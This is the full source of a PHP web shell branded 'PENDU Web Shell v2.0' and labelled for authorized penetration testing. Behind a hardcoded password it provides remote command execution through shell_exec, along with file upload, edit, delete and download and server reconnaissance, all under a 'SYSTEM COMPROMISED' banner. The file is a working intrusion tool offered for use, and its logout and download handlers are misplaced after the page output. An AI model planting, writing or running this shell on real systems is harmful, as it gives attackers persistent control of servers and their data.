<?php
/*
 * PENDU Web Shell v2.0
 * Advanced PHP Web Shell for Penetration Testing
 * For Educational and Authorized Testing Only
 */

session_start();
error_reporting(0);
ini_set('display_errors', 0);

// Configuration
$password = "pendu123"; // Change this password
$shell_title = "PENDU Web Shell";
$version = "2.0";

// Security check
if(!isset($_SESSION['authenticated']) && !isset($_POST['password'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title><?php echo $shell_title; ?></title>
        <style>
            body { background: #000; color: #00ff00; font-family: monospace; }
            .login { text-align: center; margin-top: 20%; }
            input { background: #111; color: #00ff00; border: 1px solid #00ff00; padding: 10px; }
            .skull { font-size: 50px; color: #ff0000; }
        </style>
    </head>
    <body>
        <div class="login">
            <div class="skull">💀</div>
            <h1><?php echo $shell_title; ?> v<?php echo $version; ?></h1>
            <p>AUTHORIZED ACCESS ONLY</p>
            <form method="post">
                <input type="password" name="password" placeholder="Enter Password" autofocus>
                <br><br>
                <input type="submit" value="LOGIN">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Authenticate
if(isset($_POST['password'])) {
    if($_POST['password'] == $password) {
        $_SESSION['authenticated'] = true;
    } else {
        echo "<script>alert('Access Denied!'); history.back();</script>";
        exit;
    }
}

if(!isset($_SESSION['authenticated'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Get current directory
$cwd = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();
if(!is_dir($cwd)) $cwd = getcwd();

// Handle commands
$output = "";
if(isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    
    // Change directory command
    if(preg_match('/^cd\s+(.+)$/', $cmd, $matches)) {
        $newdir = trim($matches[1]);
        if($newdir == '..') {
            $cwd = dirname($cwd);
        } elseif(is_dir($newdir)) {
            $cwd = realpath($newdir);
        } elseif(is_dir($cwd . '/' . $newdir)) {
            $cwd = realpath($cwd . '/' . $newdir);
        } else {
            $output = "Directory not found: $newdir";
        }
    } else {
        // Execute command
        chdir($cwd);
        $output = shell_exec($cmd . ' 2>&1');
        if($output === null) $output = "Command execution failed or no output";
    }
}

// File operations
if(isset($_POST['action'])) {
    switch($_POST['action']) {
        case 'upload':
            if(isset($_FILES['file'])) {
                $target = $cwd . '/' . $_FILES['file']['name'];
                if(move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    $output = "File uploaded successfully: " . $_FILES['file']['name'];
                } else {
                    $output = "Upload failed!";
                }
            }
            break;
        case 'delete':
            if(isset($_POST['file'])) {
                $file = $cwd . '/' . $_POST['file'];
                if(unlink($file)) {
                    $output = "File deleted: " . $_POST['file'];
                } else {
                    $output = "Delete failed!";
                }
            }
            break;
        case 'edit':
            if(isset($_POST['filename']) && isset($_POST['content'])) {
                $file = $cwd . '/' . $_POST['filename'];
                if(file_put_contents($file, $_POST['content'])) {
                    $output = "File saved: " . $_POST['filename'];
                } else {
                    $output = "Save failed!";
                }
            }
            break;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title><?php echo $shell_title; ?></title>
    <meta charset="UTF-8">
    <style>
        body {
            background: linear-gradient(45deg, #000, #1a0000);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
        }
        .header {
            text-align: center;
            border-bottom: 2px solid #00ff00;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .skull { font-size: 30px; color: #ff0000; }
        .container { max-width: 1200px; margin: 0 auto; }
        .section {
            background: rgba(0,0,0,0.8);
            border: 1px solid #00ff00;
            margin: 10px 0;
            padding: 15px;
            border-radius: 5px;
        }
        .cmd-input {
            width: 100%;
            background: #111;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 10px;
            font-family: monospace;
        }
        .output {
            background: #000;
            color: #fff;
            padding: 10px;
            white-space: pre-wrap;
            max-height: 300px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        .file-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .file-item {
            padding: 5px;
            border-bottom: 1px solid #333;
            display: flex;
            justify-content: space-between;
        }
        .file-item:hover { background: #333; }
        button {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 5px 10px;
            cursor: pointer;
            margin: 2px;
        }
        button:hover { background: #00cc00; }
        .danger { background: #ff0000 !important; color: #fff !important; }
        .info { color: #ffff00; }
        input[type="file"] {
            background: #111;
            color: #00ff00;
            border: 1px solid #00ff00;
            padding: 5px;
        }
        textarea {
            background: #111;
            color: #00ff00;
            border: 1px solid #00ff00;
            width: 100%;
            height: 200px;
            font-family: monospace;
        }
        .logout {
            position: absolute;
            top: 10px;
            right: 10px;
        }
    </style>
</head>
<body>
    <div class="logout">
        <a href="?logout=1" style="color: #ff0000; text-decoration: none;">[ LOGOUT ]</a>
    </div>

    <div class="container">
        <div class="header">
            <div class="skull">💀</div>
            <h1><?php echo $shell_title; ?> v<?php echo $version; ?></h1>
            <p class="info">SYSTEM COMPROMISED - FULL ACCESS GRANTED</p>
            <p>Server: <?php echo $_SERVER['SERVER_NAME']; ?> | OS: <?php echo PHP_OS; ?> | PHP: <?php echo PHP_VERSION; ?></p>
            <p>Current Directory: <strong><?php echo $cwd; ?></strong></p>
        </div>

        <!-- Command Execution -->
        <div class="section">
            <h3>🖥️ Command Execution</h3>
            <form method="post">
                <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
                <input type="text" name="cmd" class="cmd-input" placeholder="Enter command..." autofocus>
                <button type="submit">Execute</button>
            </form>
            <?php if($output): ?>
            <div class="output"><?php echo htmlspecialchars($output); ?></div>
            <?php endif; ?>
        </div>

        <!-- File Manager -->
        <div class="section">
            <h3>📁 File Manager</h3>
            <div class="file-list">
                <?php
                $files = scandir($cwd);
                foreach($files as $file) {
                    if($file == '.' || $file == '..') continue;
                    $filepath = $cwd . '/' . $file;
                    $filesize = is_file($filepath) ? filesize($filepath) : 0;
                    $filetype = is_dir($filepath) ? 'DIR' : 'FILE';
                    $permissions = substr(sprintf('%o', fileperms($filepath)), -4);
                    echo "<div class='file-item'>";
                    echo "<span>[$filetype] $file ($permissions) - " . number_format($filesize) . " bytes</span>";
                    echo "<span>";
                    if(is_file($filepath)) {
                        echo "<button onclick='editFile(\"$file\")'>Edit</button>";
                        echo "<button onclick='downloadFile(\"$file\")'>Download</button>";
                        echo "<button class='danger' onclick='deleteFile(\"$file\")'>Delete</button>";
                    }
                    echo "</span>";
                    echo "</div>";
                }
                ?>
            </div>
        </div>

        <!-- File Upload -->
        <div class="section">
            <h3>📤 File Upload</h3>
            <form method="post" enctype="multipart/form-data">
                <input type="hidden" name="action" value="upload">
                <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">
                <input type="file" name="file" required>
                <button type="submit">Upload</button>
            </form>
        </div>

        <!-- System Information -->
        <div class="section">
            <h3>🔍 System Information</h3>
            <div class="output">
User: <?php echo get_current_user(); ?>
UID: <?php echo getmyuid(); ?>
GID: <?php echo getmygid(); ?>
Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?>
Document Root: <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
PHP Safe Mode: <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?>
Disabled Functions: <?php echo ini_get('disable_functions') ?: 'None'; ?>
            </div>
        </div>
    </div>

    <script>
    function editFile(filename) {
        var content = prompt("Enter file content:");
        if(content !== null) {
            var form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = '<input type="hidden" name="action" value="edit">' +
                            '<input type="hidden" name="filename" value="' + filename + '">' +
                            '<input type="hidden" name="content" value="' + content + '">' +
                            '<input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">';
            document.body.appendChild(form);
            form.submit();
        }
    }

    function deleteFile(filename) {
        if(confirm('Delete file: ' + filename + '?')) {
            var form = document.createElement('form');
            form.method = 'post';
            form.innerHTML = '<input type="hidden" name="action" value="delete">' +
                            '<input type="hidden" name="file" value="' + filename + '">' +
                            '<input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd); ?>">';
            document.body.appendChild(form);
            form.submit();
        }
    }

    function downloadFile(filename) {
        window.open('<?php echo $_SERVER['PHP_SELF']; ?>?download=' + filename + '&cwd=<?php echo urlencode($cwd); ?>');
    }
    </script>
</body>
</html>

<?php
// Handle logout
if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Handle file download
if(isset($_GET['download']) && isset($_GET['cwd'])) {
    $file = $_GET['cwd'] . '/' . $_GET['download'];
    if(is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}
?>

